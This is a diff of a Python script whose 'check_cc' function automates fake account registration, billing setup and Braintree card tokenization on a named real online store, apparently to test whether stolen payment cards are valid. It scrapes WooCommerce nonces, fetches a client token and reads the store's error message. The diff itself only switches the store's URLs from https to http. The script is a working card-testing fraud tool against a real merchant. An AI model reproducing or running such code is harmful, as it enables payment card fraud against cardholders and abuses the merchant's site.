@@ -167,7 +167,7 @@ async def check_cc(cc_details):
 
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get('https://www.bebebrands.com/my-account/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
+            async with session.get('http://www.bebebrands.com/my-account/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 text = await r.text()
                 reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', text).group(1)
 
@@ -175,10 +175,10 @@ async def check_cc(cc_details):
                 'username': username, 'email': acc, 'password': 'SandeshThePapa@',
                 'woocommerce-register-nonce': reg, '_wp_http_referer': '/my-account/', 'register': 'Register'
             }
-            async with session.post('https://www.bebebrands.com/my-account/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
+            async with session.post('http://www.bebebrands.com/my-account/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
                 pass
 
-            async with session.get('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
+            async with session.get('http://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
                 text = await r.text()
                 address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', text).group(1)
 
@@ -189,10 +189,10 @@ async def check_cc(cc_details):
                 'woocommerce-edit-address-nonce': address_nonce,
                 '_wp_http_referer': '/my-account/edit-address/billing/', 'action': 'edit_address'
             }
-            async with session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
+            async with session.post('http://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
                 pass
 
-            async with session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
+            async with session.get('http://www.bebebrands.com/my-account/add-payment-method/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
                 text = await r.text()
                 add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text).group(1)
                 client_nonce = re.search(r'client_token_nonce":"([^"]+)"', text).group(1)
@@ -200,7 +200,7 @@ async def check_cc(cc_details):
             data = {
                 'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce
             }
-            async with session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
+            async with session.post('http://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
                 token_resp = await r.json()
                 enc = token_resp['data']
                 dec = base64.b64decode(enc).decode('utf-8')
@@ -221,8 +221,8 @@ async def check_cc(cc_details):
 
             headers.update({
                 'authority': 'www.bebebrands.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.bebebrands.com',
-                'referer': 'https://www.bebebrands.com/my-account/add-payment-method/'
+                'content-type': 'application/x-www-form-urlencoded', 'origin': 'http://www.bebebrands.com',
+                'referer': 'http://www.bebebrands.com/my-account/add-payment-method/'
             })
             data = [
                 ('payment_method', 'braintree_credit_card'), ('wc-braintree-credit-card-card-type', 'master-card'),
@@ -230,7 +230,7 @@ async def check_cc(cc_details):
                 ('wc-braintree-credit-card-tokenize-payment-method', 'true'), ('woocommerce-add-payment-method-nonce', add_nonce),
                 ('_wp_http_referer', '/my-account/add-payment-method/'), ('woocommerce_add_payment_method', '1')
             ]
-            async with session.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as response:
+            async with session.post('http://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as response:
                 text = await response.text()
                 soup = BeautifulSoup(text, 'html.parser')
                 error_message = soup.select_one('.woocommerce-error .message-container')
